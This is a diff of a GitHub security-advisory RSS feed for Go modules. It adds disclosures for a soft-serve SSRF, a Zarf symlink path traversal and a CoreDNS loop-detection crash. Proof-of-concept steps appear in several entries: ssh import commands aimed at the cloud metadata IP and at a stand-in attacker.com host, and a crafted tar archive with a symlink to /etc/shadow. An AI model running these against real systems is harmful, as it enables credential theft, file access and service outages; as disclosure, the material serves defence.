@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-03-06T22:02:49.530Z</updated>
+    <updated>2026-03-06T23:04:11.346Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,457 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/charmbracelet/soft-serve] soft-serve vulnerable to SSRF via unvalidated LFS endpoint in repo import]]></title>
+        <id>https://github.com/advisories/GHSA-3fvx-xrxq-8jvv</id>
+        <link href="https://github.com/advisories/GHSA-3fvx-xrxq-8jvv"/>
+        <updated>2026-03-06T22:16:02.000Z</updated>
+        <content type="html"><![CDATA[<p>While auditing the codebase in the wake of the webhook SSRF fix shipped in v0.11.1 (GHSA-vwq2-jx9q-9h9f), it was identified that the LFS import path was never given the same treatment. The webhook fix introduced dual-layer SSRF protection — ValidateWebhookURL() at creation time and secureHTTPClient with IP validation at dial time — but the LFS HTTP client still uses http.DefaultClient with no filtering at all.</p>
+<h3 id="summary">Summary</h3>
+<p>An authenticated SSH user can force the server to make HTTP requests to internal/private IP addresses by running <code>repo import</code> with a crafted <code>--lfs-endpoint</code> URL. The initial batch request is blind (the response from a metadata endpoint won't parse as valid LFS JSON), but an attacker hosting a fake LFS server can chain this into full read access to internal services by returning download URLs that point at internal targets.</p>
+<h3 id="details">Details</h3>
+<p>The user-controlled endpoint flows through four files with zero validation:</p>
+<p><strong>1. User supplies the URL via <code>--lfs-endpoint</code></strong> (<code>pkg/ssh/cmd/import.go:20-41</code>)</p>
+<pre><code class="language-go">cmd.Flags().StringVarP(&amp;lfsEndpoint, "lfs-endpoint", "", "", "set the Git LFS endpoint")
+</code></pre>
+<p>The flag value is passed directly into <code>proto.RepositoryOptions{LFSEndpoint: lfsEndpoint}</code> at line 40 and then to <code>be.ImportRepository()</code>.</p>
+<p><strong>2. Access check passes for any authenticated user</strong> (<code>pkg/ssh/cmd/cmd.go:172-187</code>, <code>pkg/backend/user.go:94-100</code>)</p>
+<p>The import command uses <code>checkIfCollab</code> as its <code>PersistentPreRunE</code>. For a new repo name (which is normal during import -- you're creating it), <code>AccessLevelForUser</code> hits this path:</p>
+<pre><code class="language-go">// pkg/backend/user.go:94-100
+if user != nil {
+    // If the repository doesn't exist, the user has read/write access.
+    if anon &gt; access.ReadWriteAccess {
+        return anon
+    }
+
+    return access.ReadWriteAccess
+}
+</code></pre>
+<p>This is by design -- any authenticated user can create repos via import or push (same model as Gitea/Gogs). The point isn't that the access control is wrong, just that any valid SSH key is enough to trigger the SSRF.</p>
+<p><strong>3. Endpoint flows to the LFS client unvalidated</strong> (<code>pkg/backend/repo.go:170-194</code>)</p>
+<pre><code class="language-go">// pkg/backend/repo.go:170-173
+endpoint := remote
+if opts.LFSEndpoint != "" {
+    endpoint = opts.LFSEndpoint
+}
+</code></pre>
+<p>When <code>opts.LFSEndpoint</code> is non-empty, it overrides the remote URL entirely. No URL validation, no IP check. It then flows through:</p>
+<pre><code class="language-go">// pkg/backend/repo.go:182-194
+ep, err := lfs.NewEndpoint(endpoint)
+// ...
+client := lfs.NewClient(ep)
+// ...
+if err := StoreRepoMissingLFSObjects(ctx, r, d.db, d.store, client); err != nil {
+</code></pre>
+<p><code>lfs.NewEndpoint</code> does URL parsing only -- no SSRF validation. <code>lfs.NewClient</code> calls <code>newHTTPClient</code>.</p>
+<p><strong>4. HTTP client has no protection</strong> (<code>pkg/lfs/http_client.go:24-31</code>)</p>
+<pre><code class="language-go">// pkg/lfs/http_client.go:24-31
+func newHTTPClient(endpoint Endpoint) *httpClient {
+    return &amp;httpClient{
+        client:   http.DefaultClient,
+        endpoint: endpoint,
+        transfers: map[string]TransferAdapter{
+            TransferBasic: &amp;BasicTransferAdapter{http.DefaultClient},
+        },
+    }
+}
+</code></pre>
+<p>Both the batch client and the <code>BasicTransferAdapter</code> use <code>http.DefaultClient</code> -- no SSRF protection, no IP validation, follows redirects. Compare with the webhook client that was added in v0.11.1:</p>
+<pre><code class="language-go">// pkg/webhook/webhook.go:42-76 -- the protected version
+var secureHTTPClient = &amp;http.Client{
+    Timeout: 30 * time.Second,
+    Transport: &amp;http.Transport{
+        DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
+            host, _, err := net.SplitHostPort(addr)
+            // ...
+            ip := net.ParseIP(host)
+            if ip != nil {
+                if err := ValidateIPBeforeDial(ip); err != nil {
+                    return nil, fmt.Errorf("blocked connection to private IP: %w", err)
+                }
+            }
+            // ...
+        },
+    },
+    CheckRedirect: func(*http.Request, []*http.Request) error {
+        return http.ErrUseLastResponse
+    },
+}
+</code></pre>
+<p><strong>How the attack chains together:</strong></p>
+<p><em>Stage 1 -- blind SSRF:</em> The server sends a POST to <code>&lt;attacker-endpoint&gt;/objects/batch</code> (see <code>http_client.go:57</code>). If the endpoint is a cloud metadata service like <code>http://169.254.169.254/latest/meta-data/</code>, the response won't be valid JSON, so the batch request fails with a parse error. The request is still sent though -- the attacker can confirm reachability via timing or error differentiation.</p>
+<p><em>Stage 2 -- reading internal responses via fake LFS server:</em> If the attacker hosts a fake LFS server that returns valid batch responses, the <code>BasicTransferAdapter</code> follows the download URLs from the response:</p>
+<pre><code class="language-go">// pkg/lfs/basic_transfer.go:71-89
+func (a *BasicTransferAdapter) performRequest(ctx context.Context, method string, l *Link, body io.Reader, callback func(*http.Request)) (*http.Response, error) {
+    // ...
+    req, err := http.NewRequestWithContext(ctx, method, l.Href, body)  // l.Href from batch response
+    // ...
+    res, err := a.client.Do(req)  // a.client is http.DefaultClient
+</code></pre>
+<p>The <code>l.Href</code> field comes from the attacker's batch response. The <code>a.client</code> is the same unprotected <code>http.DefaultClient</code>. So the fake LFS server can point download URLs at internal targets like <code>http://169.254.169.254/latest/api/token</code> or <code>http://10.0.0.1:8080/admin</code>, and the response bodies get written to LFS object storage on disk. Since the attacker just created the repo and has read access, they can retrieve the stored objects through the normal LFS download API.</p>
+<p><strong>Mirror sync persistence:</strong> When a repo is imported with <code>--lfs-endpoint</code>, the URL is persisted in the repo's git config at <code>lfs.url</code> (<code>repo.go:175</code>). If imported as a mirror (<code>--mirror</code>), the periodic sync job reads this config and uses the same unprotected LFS client:</p>
+<pre><code class="language-go">// pkg/jobs/mirror.go:94-111
+lfsEndpoint := rcfg.Section("lfs").Option("url")
+if lfsEndpoint == "" {
+    return
+}
+
+ep, err := lfs.NewEndpoint(lfsEndpoint)
+// ...
+client := lfs.NewClient(ep)
+// ...
+if err := backend.StoreRepoMissingLFSObjects(ctx, repo, dbx, datastore, client); err != nil {
+</code></pre>
+<p>A single <code>--mirror --lfs --lfs-endpoint &lt;internal-url&gt;</code> import creates persistent SSRF that repeats on every mirror sync without further interaction.</p>
+<p><strong>Two notes:</strong></p>
+<ul>
+<li>The batch request only fires if the imported repo contains LFS pointer blobs (checked via <code>SearchPointerBlobs</code>). The attacker needs to import a repo that has LFS objects -- easy to arrange with your own repo, but worth noting.</li>
+<li>The import path in <code>repo.go</code> does not check the global <code>cfg.LFS.Enabled</code> flag -- it always processes LFS when the <code>--lfs</code> flag is passed. The mirror path (<code>mirror.go:87</code>) does gate on <code>cfg.LFS.Enabled</code>. So the import vector works regardless of server-level LFS configuration.</li>
+</ul>
+<p><strong>Protection comparison:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Webhooks (v0.11.1+)</th>
+<th>LFS import/mirror</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>URL validation at input</td>
+<td><code>ValidateWebhookURL()</code></td>
+<td>None</td>
+</tr>
+<tr>
+<td>Custom HTTP transport</td>
+<td><code>secureHTTPClient</code> with <code>ValidateIPBeforeDial</code></td>
+<td><code>http.DefaultClient</code></td>
+</tr>
+<tr>
+<td>Redirect blocking</td>
+<td><code>CheckRedirect</code> returns <code>http.ErrUseLastResponse</code></td>
+<td>Default (follows redirects)</td>
+</tr>
+<tr>
+<td>DNS rebinding protection</td>
+<td>IP checked at dial time</td>
+<td>None</td>
+</tr>
+</tbody></table>
+<p><strong>Affected versions:</strong></p>
+<ul>
+<li>Introduced in v0.6.0 (commit <code>ea6b9a4</code> added <code>--lfs-endpoint</code> flag)</li>
+<li>Still present in v0.11.3+ (current <code>main</code>)</li>
+<li>Not fixed by v0.11.1 webhook SSRF patch (GHSA-vwq2-jx9q-9h9f) -- that fix only covers <code>pkg/webhook/</code>, not <code>pkg/lfs/</code></li>
+</ul>
+<p><strong>Suggested fix:</strong></p>
+<p>The existing SSRF protections in <code>pkg/webhook/validator.go</code> and <code>pkg/webhook/webhook.go</code> are thorough and well-tested. The cleanest fix would be to extract them to a shared internal package and apply them to the LFS client:</p>
+<ol>
+<li>Replace <code>http.DefaultClient</code> in <code>pkg/lfs/http_client.go</code> with a secure client using <code>ValidateIPBeforeDial</code> in the transport and <code>http.ErrUseLastResponse</code> in <code>CheckRedirect</code> -- matching the webhook pattern.</li>
+<li>Validate the endpoint URL in <code>pkg/backend/repo.go</code> (before <code>lfs.NewEndpoint</code>) and <code>pkg/jobs/mirror.go</code> (before creating the client) using the same checks <code>ValidateWebhookURL</code> performs.</li>
+</ol>
+<p>Both layers matter -- URL validation catches the obvious cases, <code>ValidateIPBeforeDial</code> at connection time catches DNS rebinding.</p>
+<h3 id="poc">PoC</h3>
+<p>Based on code review. These haven't been run against a live instance, but the data flow from <code>--lfs-endpoint</code> to <code>http.DefaultClient.Do()</code> is straightforward:</p>
+<pre><code class="language-bash"># Blind SSRF -- server POSTs to metadata endpoint (JSON parse will fail, but request is sent)
+ssh -p 23231 localhost repo import ssrf-test https://github.com/user/lfs-repo \
+  --lfs --lfs-endpoint http://169.254.169.254/latest/meta-data/
+
+# Reading internal responses via fake LFS server
+# 1. Host a server at attacker.com that responds to POST /objects/batch
+#    with a valid BatchResponse containing download URLs pointing at internal targets
+# 2. Import with that endpoint
+ssh -p 23231 localhost repo import ssrf-chain https://github.com/user/lfs-repo \
+  --lfs --lfs-endpoint http://attacker.com/fake-lfs/
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Any authenticated SSH user (any valid SSH key) can make the server send HTTP requests to arbitrary destinations, including internal networks and cloud metadata services.</p>
+<p>Concrete impact:</p>
+<ul>
+<li><strong>Port scanning / service discovery:</strong> Confirm reachability of internal hosts via timing and error responses</li>
+<li><strong>Cloud credential theft:</strong> Access cloud metadata endpoints (169.254.169.254) -- full credential extraction is possible through the fake-LFS-server chain unless IMDSv2 or equivalent is enforced</li>
+<li><strong>Internal API access:</strong> Read responses from internal services by routing LFS download URLs through the pipeline</li>
+<li><strong>Persistence:</strong> Mirror imports repeat the SSRF on every scheduled sync without further user action</li>
+</ul>
+<p>Reported by Vinayak Mishra
+GitHub: @vnykmshr</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/charmbracelet/soft-serve/security/advisories/GHSA-3fvx-xrxq-8jvv">https://github.com/charmbracelet/soft-serve/security/advisories/GHSA-3fvx-xrxq-8jvv</a></li>
+<li><a href="https://github.com/charmbracelet/soft-serve/commit/3ef660098ab37a7950457da8ecc25b516e37ce4e">https://github.com/charmbracelet/soft-serve/commit/3ef660098ab37a7950457da8ecc25b516e37ce4e</a></li>
+<li><a href="https://github.com/charmbracelet/soft-serve/releases/tag/v0.11.4">https://github.com/charmbracelet/soft-serve/releases/tag/v0.11.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-3fvx-xrxq-8jvv">https://github.com/advisories/GHSA-3fvx-xrxq-8jvv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3fvx-xrxq-8jvv</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-03-06T22:16:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/zarf-dev/zarf/src/pkg/archive] Zarf's symlink targets in archives are not validated against destination directory]]></title>
+        <id>https://github.com/advisories/GHSA-hcm4-6hpj-vghm</id>
+        <link href="https://github.com/advisories/GHSA-hcm4-6hpj-vghm"/>
+        <updated>2026-03-06T22:10:52.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A path traversal vulnerability in archive extraction allows a specifically crafted Zarf package to create symlinks pointing outside the destination directory, enabling arbitrary file read or write on the system processing the package.</p>
+<h3 id="what-users-should-do">What users should do</h3>
+<p>Upgrade immediately to version v0.73.1</p>
+<p>If developers cannot upgrade immediately, only process Zarf packages from fully trusted sources until the fix is applied.</p>
+<p>If using trusted packages and archives - the only impact to this is updating zarf binary or SDK package versions. Previously created packages do not need to be rebuilt.</p>
+<h3 id="who-is-affected">Who is affected</h3>
+<ul>
+<li><p>Any user of affected Zarf versions who processes packages from untrusted or semi-trusted sources. This includes packages received via file transfer, downloaded from registries, or shared across organizational boundaries. This includes use of the <code>zarf tools archiver decompress</code> functionality on generic archives.</p>
+</li>
+<li><p>Any SDK consumers of Zarf for the affected versions who utilize package load or archive operations.</p>
+</li>
+</ul>
+<h3 id="what-is-the-risk">What is the risk</h3>
+<p>A malicious Zarf package or archive could create symlinks pointing to arbitrary locations on the filesystem. This could lead to unauthorized file reads, file overwrites, or in some scenarios, code execution on the system performing the extraction in the event a file on the system is both overwritten and executed. This vulnerability does not introduce an execution path explicitly.</p>
+<h3 id="mitigating-factors">Mitigating Factors</h3>
+<p>If developers only process trusted packages and/or trusted archives (with `zarf tools archiver decompress), the risk is low. </p>
+<h3 id="details">Details</h3>
+<p>The archive extraction code in src/pkg/archive/archive.go creates symlinks from archive entries without validating that the symlink target resolves within the extraction destination directory. This affects all three extraction handler functions:</p>
+<ol>
+<li>defaultHandler (on line 320): Joins <code>dst</code> with <code>f.LinkTarget</code>, but does not verify the resolved path stays under <code>dst</code>. This means that a LinkTarget of <code>"../../../../etc/shadow"</code> would resolve outside the destination after <code>filepath.Join</code>.</li>
+<li>stripHandler (on line 342): Passes <code>f.LinkTarget</code> verbatim to <code>os.Symlink</code>.</li>
+<li>filterHandler (on line 370): Similar to <code>defaultHandler</code>, the code joins but does not validate the <code>LinkTarget</code>.</li>
+</ol>
+<p>The vulnerability is a symlink variant of the "Zip Slip" class (CVE-2018-1002200). An attacker constructs a Zarf package containing an archive entry with a malicious <code>f.LinkTarget</code>. When the package is extracted, <code>os.Symlink</code> creates a symlink pointing outside the extraction root. A subsequent archive entry targeting the same name can then read or write through the symlink to an arbitrary location on the filesystem.</p>
+<h3 id="poc">PoC</h3>
+<details>
+<summary>Proof of Concept</summary>
+You may want to follow through these steps inside of a disposable environment (container, VM):
+
+<pre><code class="language-bash">Reproduction via zarf tools archiver decompress (simplest)
+
+This demonstrates the vulnerability using the defaultHandler (line 320).
+
+# 1. Create a staging directory for the malicious archive contents.
+mkdir -p /tmp/cve-repro/archive-contents
+
+# 2. Create a symlink that traverses out of the extraction directory.
+#    This symlink targets "../../../../../../../etc/shadow" relative to
+#    whatever extraction destination is chosen.
+cd /tmp/cve-repro/archive-contents
+ln -s ../../../../../../../etc/shadow escape-link
+
+# 3. Also create a regular file so the archive isn't empty besides the link.
+echo "benign content" &gt; readme.txt
+
+# 4. Package into a tar.gz archive.
+#    The --dereference flag is NOT used, so the symlink is stored as-is.
+cd /tmp/cve-repro
+tar -czf malicious.tar.gz -C archive-contents .
+
+# 5. Verify the archive contains the symlink.
+tar -tvf malicious.tar.gz
+# Expected output includes:
+#   lrwxrwxrwx ... ./escape-link -&gt; ../../../../../../../etc/shadow
+
+# 6. Create the extraction destination (deeply nested so the traversal
+#    resolves to a real path).
+mkdir -p /tmp/cve-repro/extract/a/b/c/d
+
+# 7. Run the vulnerable extraction.
+zarf tools archiver decompress malicious.tar.gz /tmp/cve-repro/extract/a/b/c/d
+
+# 8. Verify the symlink was created pointing outside the destination.
+ls -la /tmp/cve-repro/extract/a/b/c/d/escape-link
+# Expected: escape-link /etc/shadow
+#
+# The symlink target resolves to /etc/shadow, which is OUTSIDE
+# the extraction directory /tmp/cve-repro/extract/a/b/c/d/.
+
+readlink -f /tmp/cve-repro/extract/a/b/c/d/escape-link
+# Expected: /etc/shadow
+
+What happened: defaultHandler (line 320) executed:
+os.Symlink(filepath.Join(dst, f.LinkTarget), target)
+// = os.Symlink("/tmp/cve-repro/extract/a/b/c/d/../../../../../../../etc/shadow",
+//              "/tmp/cve-repro/extract/a/b/c/d/escape-link")
+filepath.Join cleans the path to /etc/shadow, which is outside dst. No validation is performed.
+</code></pre>
+</details>
+### References
+
+<ul>
+<li><a href="https://github.com/zarf-dev/zarf/security/advisories/GHSA-hcm4-6hpj-vghm">https://github.com/zarf-dev/zarf/security/advisories/GHSA-hcm4-6hpj-vghm</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-29064">https://nvd.nist.gov/vuln/detail/CVE-2026-29064</a></li>
+<li><a href="https://github.com/zarf-dev/zarf/releases/tag/v0.73.1">https://github.com/zarf-dev/zarf/releases/tag/v0.73.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-hcm4-6hpj-vghm">https://github.com/advisories/GHSA-hcm4-6hpj-vghm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hcm4-6hpj-vghm</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-06T22:10:48.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/coredns/coredns] CoreDNS Loop Detection Denial of Service Vulnerability]]></title>
+        <id>https://github.com/advisories/GHSA-h75p-j8xm-m278</id>
+        <link href="https://github.com/advisories/GHSA-h75p-j8xm-m278"/>
+        <updated>2026-03-06T22:08:22.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="executive-summary">Executive Summary</h2>
+<p>A Denial of Service vulnerability exists in CoreDNS's loop detection plugin that allows an attacker to crash the DNS server by sending specially crafted DNS queries. The vulnerability stems from the use of a predictable pseudo-random number generator (PRNG) for generating a secret query name, combined with a fatal error handler that terminates the entire process.</p>
+<hr>
+<h2 id="technical-details">Technical Details</h2>
+<h3 id="vulnerability-description">Vulnerability Description</h3>
+<p>The CoreDNS <code>loop</code> plugin is designed to detect forwarding loops by performing a self-test during server startup. The plugin generates a random query name (<code>qname</code>) using Go's <code>math/rand</code> package and sends an HINFO query to itself. If the server receives multiple matching queries, it assumes a forwarding loop exists and terminates.</p>
+<p><strong>The vulnerability arises from two design flaws:</strong></p>
+<ol>
+<li><p><strong>Predictable PRNG Seed</strong>: The random number generator is seeded with <code>time.Now().UnixNano()</code>, making the generated qname predictable if an attacker knows the approximate server start time.</p>
+</li>
+<li><p><strong>Fatal Error Handler</strong>: When the plugin detects what it believes is a loop (3+ matching HINFO queries), it calls <code>log.Fatalf()</code> which invokes <code>os.Exit(1)</code>, immediately terminating the process without cleanup or recovery.</p>
+</li>
+</ol>
+<h3 id="affected-code">Affected Code</h3>
+<p><strong>File: <code>plugin/loop/setup.go</code></strong></p>
+<pre><code class="language-go">// PRNG seeded with predictable timestamp
+var r = rand.New(time.Now().UnixNano())
+
+// Qname generation using two consecutive PRNG calls
+func qname(zone string) string {
+    l1 := strconv.Itoa(r.Int())
+    l2 := strconv.Itoa(r.Int())
+    return dnsutil.Join(l1, l2, zone)
+}
+</code></pre>
+<p><strong>File: <code>plugin/loop/loop.go</code></strong></p>
+<pre><code class="language-go">func (l *Loop) ServeDNS(ctx context.Context, w dns.ResponseWriter, r *dns.Msg) (int, error) {
+    // ... validation checks ...
+    
+    if state.Name() == l.qname {
+        l.inc()  // Increment counter
+    }
+
+    if l.seen() &gt; 2 {
+        // FATAL: Terminates entire process
+        log.Fatalf("Loop (%s -&gt; %s) detected for zone %q...", ...)
+    }
+    
+    // ...
+}
+</code></pre>
+<p><strong>File: <code>plugin/pkg/log/log.go</code></strong></p>
+<pre><code class="language-go">func Fatalf(format string, v ...any) {
+    logf(fatal, format, v...)
+    os.Exit(1)  // Immediate process termination
+}
+</code></pre>
+<h3 id="exploitation-window">Exploitation Window</h3>
+<p>The loop plugin remains active during the following conditions:</p>
+<table>
+<thead>
+<tr>
+<th>Condition</th>
+<th>Window Duration</th>
+<th>Attack Feasibility</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Healthy startup</td>
+<td>2 seconds</td>
+<td>Requires precise timing</td>
+</tr>
+<tr>
+<td>Self-test failure (upstream unreachable)</td>
+<td>30 seconds</td>
+<td><strong>HIGH</strong> - Extended window</td>
+</tr>
+<tr>
+<td>Network degradation</td>
+<td>Variable</td>
+<td>Depends on retry behavior</td>
+</tr>
+</tbody></table>
+<h3 id="attack-scenario">Attack Scenario</h3>
+<p><strong>Primary Attack Vector: Network Degradation</strong></p>
+<p>When the upstream DNS server is unreachable (network partition, misconfiguration, outage), the loop plugin's self-test fails repeatedly. During this period:</p>
+<ol>
+<li>The loop plugin remains active for up to 30 seconds</li>
+<li>Each self-test attempt generates an HINFO query visible in CoreDNS logs</li>
+<li>An attacker with log access (shared Kubernetes cluster, centralized logging) can observe the qname</li>
+<li>The attacker sends 3 HINFO queries with the observed qname</li>
+<li>The server immediately crashes</li>
+</ol>
+<pre><code>┌──────────────────────────────────────────────────────────────────────────┐
+│                         ATTACK TIMELINE                                  │
+├──────────────────────────────────────────────────────────────────────────┤
+│ T+0s     CoreDNS starts, PRNG seeded with UnixNano()                     │
+│ T+0.5s   Self-test HINFO query sent (visible in logs)                    │
+│ T+2s     Self-test fails (upstream timeout)                              │
+│ T+3s     Retry #1 - counter resets, qname unchanged                      │
+│ T+5s     Retry #2 - attacker observes qname in logs                      │
+│ T+5.1s   ATTACKER: Send HINFO #1 → counter = 1                           │
+│ T+5.2s   ATTACKER: Send HINFO #2 → counter = 2                           │
+│ T+5.3s   ATTACKER: Send HINFO #3 → counter = 3 → os.Exit(1)              │
+│ T+5.3s   SERVER CRASHES                                                  │
+└──────────────────────────────────────────────────────────────────────────┘
+</code></pre>
+<hr>
+<h2 id="impact-assessment">Impact Assessment</h2>
+<h3 id="attack-requirements">Attack Requirements</h3>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Network Access</td>
+<td>Must be able to send UDP packets to CoreDNS port</td>
+</tr>
+<tr>
+<td>Log Access</td>
+<td>Required to observe the qname (common in shared clusters)</td>
+</tr>
+<tr>
+<td>Timing</td>
+<td>Extended window during network degradation</td>
+</tr>
+<tr>
+<td>Authentication</td>
+<td>None required</td>
+</tr>
+</tbody></table>
+<h3 id="real-world-impact">Real-World Impact</h3>
+<p>CoreDNS is the default DNS server for Kubernetes clusters. A successful attack would:</p>
+<ol>
+<li><strong>Disruption</strong>: All DNS resolution fails within the cluster</li>
+<li><strong>Cascading Failures</strong>: Services unable to discover each other</li>
+<li><strong>Restart Loop</strong>: If attack persists, CoreDNS enters crash-restart cycle</li>
+<li><strong>Data Plane Impact</strong>: Application-level failures across the cluster</li>
+</ol>
+<h2 id="references">References</h2>
+<ul>
+<li>CoreDNS GitHub: <a href="https://github.com/coredns/coredns">https://github.com/coredns/coredns</a></li>
+<li>Loop Plugin Documentation: <a href="https://coredns.io/plugins/loop/">https://coredns.io/plugins/loop/</a></li>
+<li>Go math/rand Documentation: <a href="https://pkg.go.dev/math/rand">https://pkg.go.dev/math/rand</a></li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/coredns/coredns/security/advisories/GHSA-h75p-j8xm-m278">https://github.com/coredns/coredns/security/advisories/GHSA-h75p-j8xm-m278</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26018">https://nvd.nist.gov/vuln/detail/CVE-2026-26018</a></li>
+<li><a href="https://github.com/coredns/coredns/releases/tag/v1.14.2">https://github.com/coredns/coredns/releases/tag/v1.14.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-h75p-j8xm-m278">https://github.com/advisories/GHSA-h75p-j8xm-m278</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h75p-j8xm-m278</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-06T22:08:22.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/pinchtab/pinchtab/cmd/pinchtab] PinchTab has SSRF with Full Response Exfiltration via Download Handler]]></title>
         <id>https://github.com/advisories/GHSA-rw8p-c6hf-q3pg</id>
@@ -70,7 +521,7 @@ If a service is running on <code>localhost:8080</code>, access it via:</p>
         <title type="html"><![CDATA[[github.com/coredns/coredns] CoreDNS ACL Bypass]]></title>
         <id>https://github.com/advisories/GHSA-c9v3-4pv7-87pr</id>
         <link href="https://github.com/advisories/GHSA-c9v3-4pv7-87pr"/>
-        <updated>2026-03-06T18:04:01.000Z</updated>
+        <updated>2026-03-06T22:43:40.000Z</updated>
         <content type="html"><![CDATA[<p>A logical vulnerability in CoreDNS allows DNS access controls to be bypassed due to the default execution order of plugins. Security plugins such as acl are evaluated before the rewrite plugin, resulting in a Time-of-Check Time-of-Use (TOCTOU) flaw.</p>
 <h3 id="impact">Impact</h3>
 <p>In multi-tenant Kubernetes clusters, this flaw undermines DNS-based segmentation strategies.</p>
@@ -97,6 +548,7 @@ If a service is running on <code>localhost:8080</code>, access it via:</p>
 <ul>
 <li><a href="https://github.com/coredns/coredns/security/advisories/GHSA-c9v3-4pv7-87pr">https://github.com/coredns/coredns/security/advisories/GHSA-c9v3-4pv7-87pr</a></li>
 <li><a href="https://github.com/coredns/coredns/releases/tag/v1.14.2">https://github.com/coredns/coredns/releases/tag/v1.14.2</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26017">https://nvd.nist.gov/vuln/detail/CVE-2026-26017</a></li>
 <li><a href="https://github.com/advisories/GHSA-c9v3-4pv7-87pr">https://github.com/advisories/GHSA-c9v3-4pv7-87pr</a></li>
 </ul>
 ]]></content>
@@ -197,7 +649,7 @@ Authorization: Bearer &lt;valid_token&gt;
         <title type="html"><![CDATA[[github.com/OliveTin/OliveTin] OliveTin doesn't check view permission when returning dashboards]]></title>
         <id>https://github.com/advisories/GHSA-jf73-858c-54pg</id>
         <link href="https://github.com/advisories/GHSA-jf73-858c-54pg"/>
-        <updated>2026-03-05T21:24:25.000Z</updated>
+        <updated>2026-03-06T22:52:34.000Z</updated>
         <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
 <p>An authorization flaw in OliveTin allows authenticated users with view: false permission to enumerate action bindings and metadata via dashboard and API endpoints.</p>
 <p>Although execution (exec) may be correctly denied, the backend does not enforce IsAllowedView() when constructing dashboard and action binding responses. As a result, restricted users can retrieve action titles, IDs, icons, and argument metadata.</p>
@@ -324,6 +776,7 @@ Observed behavior (vulnerable):</p>
 <li><a href="https://github.com/OliveTin/OliveTin/security/advisories/GHSA-jf73-858c-54pg">https://github.com/OliveTin/OliveTin/security/advisories/GHSA-jf73-858c-54pg</a></li>
 <li><a href="https://github.com/OliveTin/OliveTin/commit/d7962710e7c46f6bdda4188b5b0cdbde4be665a0">https://github.com/OliveTin/OliveTin/commit/d7962710e7c46f6bdda4188b5b0cdbde4be665a0</a></li>
 <li><a href="https://github.com/OliveTin/OliveTin/releases/tag/3000.11.1">https://github.com/OliveTin/OliveTin/releases/tag/3000.11.1</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30233">https://nvd.nist.gov/vuln/detail/CVE-2026-30233</a></li>
 <li><a href="https://github.com/advisories/GHSA-jf73-858c-54pg">https://github.com/advisories/GHSA-jf73-858c-54pg</a></li>
 </ul>
 ]]></content>
@@ -432,7 +885,7 @@ Observed server log:
         <title type="html"><![CDATA[[github.com/OliveTin/OliveTin] OliveTin's RestartAction always runs actions as guest]]></title>
         <id>https://github.com/advisories/GHSA-p443-p7w5-2f7f</id>
         <link href="https://github.com/advisories/GHSA-p443-p7w5-2f7f"/>
-        <updated>2026-03-05T22:06:55.000Z</updated>
+        <updated>2026-03-06T22:52:20.000Z</updated>
         <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
 <p>An authentication context confusion vulnerability in RestartAction allows a low‑privileged authenticated user to execute actions they are not permitted to run.</p>
 <p>RestartAction constructs a new internal connect.Request without preserving the original caller’s authentication headers or cookies. When this synthetic request is passed to StartAction, the authentication resolver falls back to the guest user. If the guest account has broader permissions than the authenticated caller, this results in privilege escalation and unauthorized command execution.</p>
@@ -550,6 +1003,7 @@ Because OliveTin actions execute system shell commands, this can lead to:</li>
 <li><a href="https://github.com/OliveTin/OliveTin/security/advisories/GHSA-p443-p7w5-2f7f">https://github.com/OliveTin/OliveTin/security/advisories/GHSA-p443-p7w5-2f7f</a></li>
 <li><a href="https://github.com/OliveTin/OliveTin/commit/cb46a597b2465235839ed58cf034b5e7b70ef911">https://github.com/OliveTin/OliveTin/commit/cb46a597b2465235839ed58cf034b5e7b70ef911</a></li>
 <li><a href="https://github.com/OliveTin/OliveTin/releases/tag/3000.11.1">https://github.com/OliveTin/OliveTin/releases/tag/3000.11.1</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30225">https://nvd.nist.gov/vuln/detail/CVE-2026-30225</a></li>
